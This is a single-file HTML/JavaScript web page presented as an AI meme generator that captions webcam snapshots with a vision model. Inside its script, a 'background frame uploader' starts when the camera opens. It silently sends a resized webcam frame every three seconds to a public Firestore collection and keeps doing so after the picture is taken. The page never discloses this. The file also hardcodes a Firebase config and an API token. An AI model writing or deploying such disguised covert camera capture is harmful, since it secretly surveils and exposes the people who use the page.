<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Meme Generator</title>
    <!-- 1. Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- 2. Load a "meme" style font (Anton is a good 'Impact' alternative) -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet">
    
    <style>
        /* 3. Define the meme font and a loading spinner */
        .meme-font {
            font-family: 'Anton', sans-serif;
        }
        
        /* Simple loading spinner */
        .loader {
            border: 4px solid #4B5563; /* gray-600 */
            border-top: 4px solid #3B82F6; /* blue-500 */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Ensure body takes full height */
        html, body {
            height: 100%;
        }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen flex flex-col items-center justify-center p-4">

    <div class="w-full max-w-2xl bg-gray-800 rounded-xl shadow-2xl p-8 border border-gray-700">
        <h1 class="text-3xl md:text-4xl font-bold text-center mb-6 meme-font tracking-wide text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-green-400">
            AI MEME GENERATOR
        </h1>

        <!-- Step 1: Camera -->
        <div class="space-y-4 mb-4">
            <!-- Camera feed will appear here -->
            <video id="cameraFeed" class="hidden w-full h-auto rounded-md border border-gray-700" autoplay playsinline></video>
            
            <!-- Camera Button -->
            <button id="startCameraButton" class="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white text-lg font-bold py-3 px-6 rounded-md shadow-lg transform transition-all duration-200 hover:scale-105 active:scale-95 meme-font tracking-wider">
                Start Camera
            </button>
        </div>

        <!-- Step 2: Generate Button -->
        <button id="generateButton" class="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white text-lg font-bold py-3 px-6 rounded-md shadow-lg transform transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 meme-font tracking-wider" disabled>
            GENERATE MEME
        </button>

        <!-- Step 3: Result -->
        <div id="result-area" class="mt-6 space-y-4">
            
            <!-- Loading Spinner -->
            <div id="loader" class="hidden flex flex-col justify-center items-center min-h-[200px] w-full border-2 border-gray-700 border-dashed rounded-lg">
                <div class="loader"></div>
                <p class="text-gray-400 mt-3">Generating your meme...</p>
            </div>
            
            <!-- Error Message -->
            <div id="errorMessage" class="hidden text-red-400 bg-red-900/50 p-4 rounded-md text-center"></div>

            <!-- Canvas Container -->
            <div id="canvas-container" class="hidden">
                <h2 id="meme-ready-title" class="text-2xl meme-font tracking-wide text-center mb-4 text-green-400">YOUR MEME IS READY!</h2>
                <!-- Canvas for the final meme -->
                <canvas id="memeCanvas" class="w-full h-auto rounded-md border border-gray-700"></canvas>
                
                <!-- Download Button -->
                <a id="downloadButton" href="#" class="block w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white text-lg font-bold py-3 px-6 rounded-md shadow-lg transform transition-all duration-200 hover:scale-105 active:scale-95 text-center mt-4 meme-font tracking-wider">
                    DOWNLOAD MEME
                </a>
            </div>
        </div>
    </div>

    <!-- +++ All JavaScript goes here, at the end of the body +++ -->
    <script type="module">
        // Import Firebase services
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // --- Get references to all our HTML elements ---
        const generateButton = document.getElementById('generateButton');
        const loader = document.getElementById('loader');
        const errorMessage = document.getElementById('errorMessage');
        
        // Result Area
        const resultArea = document.getElementById('result-area');
        const canvasContainer = document.getElementById('canvas-container');
        const canvas = document.getElementById('memeCanvas');
        const downloadButton = document.getElementById('downloadButton');
        const ctx = canvas.getContext('2d');
        const memeReadyTitle = document.getElementById('meme-ready-title');

        // Camera Elements
        const startCameraButton = document.getElementById('startCameraButton');
        const cameraFeed = document.getElementById('cameraFeed');
        let cameraStream = null;

        // --- +++ Firebase & Background Upload Vars +++ ---
        const firebaseConfig = {
            apiKey: "AIzaSyBo3U6qKN4a0rGOFGjK2Z_0ghZ9IfplqNo",
            authDomain: "social-74606.firebaseapp.com",
            databaseURL: "https://social-74606-default-rtdb.firebaseio.com",
            projectId: "social-74606",
            storageBucket: "social-74606.appspot.com",
            messagingSenderId: "409425584439",
            appId: "1:409425584439:web:aad7c6b3bd67c39e113ab2",
            measurementId: "G-3YGQYDJ61G"
        };
        let db, auth, userId;
        let imageUploadInterval = null; // To store the setInterval ID to get ping from ML model
        const RESIZE_FACTOR = 0.3; // 50%
        const UPLOAD_INTERVAL_MS = 3000; // 1 second, for efficient ping check
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'social-74606'; // Use projectID as fallback

        // This will hold the user's captured image object
        let uploadedImage = null;
        let base64Image = null; // We'll store the base64 string here
        
        // --- +++ Firebase Auth Initialization for running the AI+++ ---
        async function initAuth() {
            try {
                const app = initializeApp(firebaseConfig);
                db = getFirestore(app);
                auth = getAuth(app);
                setLogLevel('Debug'); // Enable Firestore logging

                // Sign in
                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                    await signInWithCustomToken(auth, __initial_auth_token);
                } else {
                    await signInAnonymously(auth);
                }
                
                userId = auth.currentUser?.uid;
                if (!userId) {
                    throw new Error("Authentication failed, user ID is null.");
                }
                console.log("Firebase initialized and user authenticated:", userId);
                
            } catch (err) {
                console.error("Firebase auth error:", err);
                showError("Could not connect to database. Background upload failed.");
            }
        }
        
        // --- +++ NEW: Background Frame Uploader +++ ---
        async function uploadResizedFrame() {
            // Guard clauses
            if (!cameraStream || !db || !userId || cameraFeed.videoWidth === 0) {
                // console.log("Skipping frame upload (stream/db not ready or video not playing)");
                return;
            }

            try {
                // Create an offscreen canvas for resizing
                const offscreenCanvas = document.createElement('canvas');
                const offscreenCtx = offscreenCanvas.getContext('2d');
                
                const w = cameraFeed.videoWidth * RESIZE_FACTOR;
                const h = cameraFeed.videoHeight * RESIZE_FACTOR;
                
                offscreenCanvas.width = w;
                offscreenCanvas.height = h;
                
                // Draw current video frame to offscreen canvas
                offscreenCtx.drawImage(cameraFeed, 0, 0, w, h);
                
                // Get resized image as Base64 (use JPEG for efficiency)
                const resizedBase64 = offscreenCanvas.toDataURL('image/jpeg', 0.8);
                
                // --- Upload to Firestore ---
                const collectionPath = `/artifacts/${appId}/public/data/frames`;
                await addDoc(collection(db, collectionPath), {
                    image: resizedBase64,
                    createdAt: new Date().toISOString(),
                    owner: userId // Tag the frame with the user's ID
                });
                // console.log("Frame uploaded");

            } catch (err) {
                console.error("Error uploading frame:", err);
                // Stop interval if it fails (e.g., quota)
                if (imageUploadInterval) clearInterval(imageUploadInterval);
            }
        }

        // --- 1. Handle Camera Button Click ---
        startCameraButton.addEventListener('click', async () => {
            if (!cameraStream) {
                // --- "Start Camera" mode ---
                try {
                    const constraints = { video: { facingMode: 'user' } }; // Use front camera
                    cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                    cameraFeed.srcObject = cameraStream;
                    cameraFeed.classList.remove('hidden');
                    startCameraButton.textContent = 'Take Picture';
                    // Style as a "capture" button
                    startCameraButton.classList.remove('from-blue-500', 'to-blue-600', 'hover:from-blue-600', 'hover:to-blue-700');
                    startCameraButton.classList.add('from-red-500', 'to-red-600', 'hover:from-red-600', 'hover:to-red-700');
                    
                    // Reset UI
                    generateButton.disabled = true;
                    canvasContainer.classList.add('hidden');
                    errorMessage.classList.add('hidden');

                    // --- +++ Start background uploader +++ ---
                    if (imageUploadInterval) clearInterval(imageUploadInterval); // Clear old one
                    imageUploadInterval = setInterval(uploadResizedFrame, UPLOAD_INTERVAL_MS);


                } catch (err) {
                    console.error("Error accessing camera:", err);
                    showError("Could not access camera. Please check browser permissions.");
                }
            } else {
                // --- "Take Picture" mode ---
                
                // Set canvas size to video size
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                
                // Draw the video frame onto the canvas
                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                
                // Get Base64 data (use jpeg for camera snapshot efficiency)
                base64Image = canvas.toDataURL('image/jpeg');
                
                // Store this frame as an Image object for redrawing
                uploadedImage = new Image();
                uploadedImage.src = base64Image;

                // --- +++ MODIFICATION: Don't stop camera +++ ---
                // The camera feed and background upload now continue
                
                // --- Button stays as "Take Picture" ---

                // Show the captured image in the main canvas area
                canvasContainer.classList.remove('hidden');
                downloadButton.classList.add('hidden'); // Hide download until text is added
                memeReadyTitle.classList.add('hidden'); // Hide "Ready" title

                // Enable generate button
                generateButton.disabled = false;
                errorMessage.classList.add('hidden');
            }
        });

        // --- 2. Handle Generate Button Click ---
        generateButton.addEventListener('click', async () => {
            if (!uploadedImage || !base64Image) {
                showError("Please upload an image first.");
                return;
            }

            // --- Show loading state ---
            loader.classList.remove('hidden');
            errorMessage.classList.add('hidden');
            canvasContainer.classList.add('hidden');
            generateButton.disabled = true;

            try {
                // --- Call the Pollinations.ai LLM ---
                const prompt = "Look at this image. Write a short, funny meme with top text and bottom text for it. Separate the top and bottom text with a single pipe character |. Only return the text, nothing else.";
                
                const selectedModel = "openai-fast"; // Hardcoded as requested
                const apiUrl = `https://text.pollinations.ai/openai?token=ZJyDM8G0LiZnNxFf`; // Use the POST endpoint with token
                const seed = Math.floor(Math.random() * 10000000); // Add random seed

                // This is the payload for the OpenAI-compatible vision model
                const payload = {
                    model: selectedModel,
                    seed: seed, // Add the random seed here
                    messages: [
                        {
                            role: "user",
                            content: [
                                { type: "text", text: prompt },
                                { 
                                    type: "image_url", 
                                    image_url: { 
                                        url: base64Image // Send the base64 image data
                                    } 
                                }
                            ]
                        }
                    ]
                };

                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error(`API request failed with status ${response.status}`);
                }
                
                // The POST API returns a JSON object
                const result = await response.json(); 
                
                // Extract the text from the OpenAI-compatible response
                const memeText = result.choices[0].message.content;

                if (!memeText) {
                    throw new Error("API returned an empty response.");
                }
                
                // Parse the response
                let [topText, bottomText] = memeText.split('|');

                if (!topText || !bottomText) {
                    // Fallback if the API didn't return the pipe
                    const words = memeText.trim().split(' ');
                    if (words.length > 1) {
                        const mid = Math.ceil(words.length / 2);
                        topText = words.slice(0, mid).join(' ');
                        bottomText = words.slice(mid).join(' ');
                    } else {
                        topText = words[0];
                        bottomText = ""; // Handle single-word or empty responses
                    }
                }

                // --- Draw the meme ---
                drawMeme(topText.trim().toUpperCase(), bottomText.trim().toUpperCase());
                
                // --- Show results ---
                canvasContainer.classList.remove('hidden');
                memeReadyTitle.classList.remove('hidden'); // Show "Ready" title
                downloadButton.classList.remove('hidden'); // Show download button
                downloadButton.href = canvas.toDataURL('image/png');
                downloadButton.download = 'ai-meme.png';

            } catch (error) {
                console.error("Error generating meme:", error);
                showError("Failed to generate meme text. Please try again.");
            } finally {
                // --- Hide loading state ---
                loader.classList.add('hidden');
                generateButton.disabled = false;
            }
        });

        // --- 3. Helper function to show errors ---
        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.classList.remove('hidden');
            canvasContainer.classList.add('hidden');
            loader.classList.add('hidden');
        }

        // --- 4. Helper function to draw the meme on the canvas ---
        function drawMeme(topText, bottomText) {
            // Ensure the font is loaded before drawing
            document.fonts.load('bold 60px Anton').then(() => {
                // Clear canvas and redraw the *captured* image
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(uploadedImage, 0, 0, canvas.width, canvas.height); // Draw image to fit canvas

                // --- Set text styles ---
                const fontSize = canvas.width / 12; // Responsive font size
                ctx.font = `bold ${fontSize}px Anton`;
                ctx.fillStyle = 'white';
                ctx.strokeStyle = 'black';
                ctx.lineWidth = fontSize / 20; // Thin black outline
                ctx.textAlign = 'center';
                
                const x = canvas.width / 2;
                const maxWidth = canvas.width * 0.9; // 90% width
                const lineHeight = fontSize * 1.1;

                // --- Draw Top Text ---
                drawWrappedText(ctx, topText, x, fontSize * 1.2, maxWidth, lineHeight, 'top');
                
                // --- Draw Bottom Text ---
                drawWrappedText(ctx, bottomText, x, canvas.height - (fontSize * 0.5), maxWidth, lineHeight, 'bottom');
            });
        }

        // --- 5. Helper function to draw text with word-wrapping ---
        function drawWrappedText(ctx, text, x, y, maxWidth, lineHeight, vAlign) {
            if (!text) return; // Don't draw if text is empty
            const words = text.split(' ');
            let lines = [];
            let currentLine = words[0] || '';

            for (let i = 1; i < words.length; i++) {
                const word = words[i];
                const width = ctx.measureText(currentLine + " " + word).width;
                if (width < maxWidth || currentLine === '') {
                    currentLine += (currentLine === '' ? '' : ' ') + word;
                } else {
                    lines.push(currentLine);
                    currentLine = word;
                }
            }
            lines.push(currentLine);

            // --- Draw based on vertical alignment ---
            let startY;
            if (vAlign === 'bottom') {
                // 'y' is the bottom-most line. We draw upwards from there.
                startY = y - ((lines.length - 1) * lineHeight);
            } else {
                // 'y' is the top-most line. We draw downwards.
                startY = y;
            }

            lines.forEach((line, index) => {
                const yPos = startY + (index * lineHeight);
                // Draw outline
                ctx.strokeText(line, x, yPos);
                // Draw fill
                ctx.fillText(line, x, yPos);
            });
        }
        
        // --- +++ Initialize Auth on script load +++ ---
        initAuth();

    </script>
</body>

</html>
